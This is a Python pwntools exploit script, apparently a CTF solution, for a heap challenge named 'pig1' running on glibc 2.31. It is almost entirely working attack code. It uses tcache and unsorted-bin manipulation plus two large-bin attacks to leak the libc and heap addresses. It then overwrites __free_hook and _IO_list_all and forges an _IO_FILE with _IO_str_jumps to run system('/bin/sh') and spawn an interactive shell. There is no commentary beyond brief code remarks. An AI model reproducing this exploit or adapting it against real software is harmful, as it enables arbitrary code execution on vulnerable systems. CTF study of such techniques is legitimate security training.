#! /usr/bin/env python3
from pwn import *

arch = 64
challenge = './pig1'

context.os='linux'
context.log_level = 'debug'
if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(challenge)
libc = ELF('libc-2.31.so')

local = 1
if local:
    p = process(challenge)
else:
    p = remote('chuj.top', '53178')


def debug():
    gdb.attach(p)
    pause()

bps = []
pie = 1
def gdba():
    if local == 0:
        return 0
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1],16)
        cmd += ''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd += 'set $base={:#x}\n'.format(base)
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])

    gdb.attach(p,cmd)

def eat():
    p.recvuntil('Choice: ')

def add(size, con):
    eat()
    p.sendline('1')
    p.recvuntil('sage size: ')
    p.sendline(str(size))
    p.recvuntil("'s message: ")
    p.send(con)

def show(idx):
    eat()
    p.sendline('2')
    p.recvuntil('index: ')
    p.sendline(str(idx))

def edit(idx, con):
    eat()
    p.sendline('3')
    p.recvuntil('index: ')
    p.sendline(str(idx))
    p.recvuntil("'s message: ")
    p.send(con)

def dele(idx):
    eat()
    p.sendline('4')
    p.recvuntil('index: ')
    p.sendline(str(idx))

def change(user):
    eat()
    p.sendline('5')
    if user == 1:
        p.recvuntil('user:\n')
        p.sendline('\x41\x01\x95\xC9\x1C')
    elif user == 2:
        p.recvuntil('user:\n')
        p.sendline('\x42\x01\x87\xC3\x19')
    elif user == 3:
        p.recvuntil('user:\n')
        p.sendline('\x43\x01\xF7\x3C\x32')

change(2)
for i in range(5):
    add(0x90,'tcache padding\n' * (0x90 // 0x30))#* B0-B4
    dele(i)


change(1)
add(0x150,'to unsorted\n' * (0x150 // 0x30))#* A0
for i in range(7):
    add(0x150,'tcache padding\n' * (0x150 // 0x30))#* A1-A7
    dele(i+1)

dele(0)
change(2)
add(0xb0,'splitA0\n' * (0x90 // 0x30))#* B5 切割

change(1)
add(0x150,'to unsorted\n' * (0x150 // 0x30))#* A8
add(0x150,'top\n' * (0x150 // 0x30))#* A9

dele(8)

change(2)
add(0xb0,'splitA8\n' * (0x90 // 0x30))#* B6 切割


change(1)
add(0x410,'leak\n' * (0x410 // 0x30))#* A10
add(0x410,'top\n' * (0x410 // 0x30))#* A11

dele(10)
change(2)
change(1)
show(10)

p.recvuntil('message is: ')
libc.address = u64(p.recv(6).ljust(8,b'\x00'))-0x1ebbe0
log.success("libc.address: "+hex(libc.address))

show(2)
p.recvuntil('message is: ')
heapbase = u64(p.recv(6).ljust(8, b"\x00"))-0x12330
log.success("heapbase: "+hex(heapbase))

free_hook = libc.symbols["__free_hook"]
log.success("free_hook: "+hex(free_hook))
system_addr = libc.sym['system']
log.success('system_addr: ' + hex(system_addr))
_IO_list_all = libc.symbols['_IO_list_all']
log.success('_IO_list_all: ' + hex(_IO_list_all))

add(0x410,'back\n' * (0x410 // 0x30))#* A12

change(2)
add(0x420,'large1\n' * (0x420 // 0x30))#* B7
add(0x420,'top\n' * (0x420 // 0x30))#* B8
dele(7)
add(0x430,'push\n' * (0x430 // 0x30))#* B9

change(1)
dele(12)

change(2)
edit(7, p64(0) + p64(free_hook-0x28) + b'\n')#! chunk_data+0x10 开始写
log.success("free_hook-0x28: " + hex(free_hook-0x28))

change(1)
add(0x430,'push\n' * (0x430 // 0x30))#* A13
#! first larbin_attack

change(3)

add(0x410,'back\n' * (0x410 // 0x30))#* C0


change(2)
edit(7, p64(0) + p64(_IO_list_all-0x20) + b'\n')#! chunk_data+0x10 开始写


change(1)

edit(8, (p64(heapbase+0x12280) + p64(free_hook-0x20)) * (0x150 // 0x30))#! chunk_data 开始写


change(3)
add(0x90,'stash\n' * (0x90 // 0x30))#* C1


change(3)
dele(0)


add(0x430,'push\n' * (0x430 // 0x30))#* C2

add(0x330,'pass\n' * (0x330 // 0x30))#* C3
debug()
add(0x430,'pass\n' * (0x430 // 0x30))#* C4


_IO_str_jumps_addr = libc.address + 0x1ed560
log.success('_IO_str_jumps_addr: ' + hex(_IO_str_jumps_addr))
fake_IO_FILE = 2 * p64(0)
fake_IO_FILE += p64(1) # _IO_write_base
fake_IO_FILE += p64(0xFFFFFFFFFFFFFFFF) # _IO_write_ptr
fake_IO_FILE += p64(0) # _IO_write_end
fake_IO_FILE += p64(heapbase + 0x138a0) # old_buf, _IO_buf_base /bin/sh
fake_IO_FILE += p64(heapbase + 0x138a0 + 0x18) # calc the memcpy length, _IO_buf_end
fake_IO_FILE = fake_IO_FILE.ljust(0xC0 - 0x10,b'\x00')
fake_IO_FILE += p32(0) # mode <= 0
fake_IO_FILE += p32(0) + p64(0) * 2 # bypass _unused2
fake_IO_FILE += p64(_IO_str_jumps_addr)
payload = fake_IO_FILE + b'/bin/sh\x00'*2 + p64(system_addr)

p.sendafter('Gift:', payload)

eat()

p.sendline('5')
p.sendline('')

p.interactive()
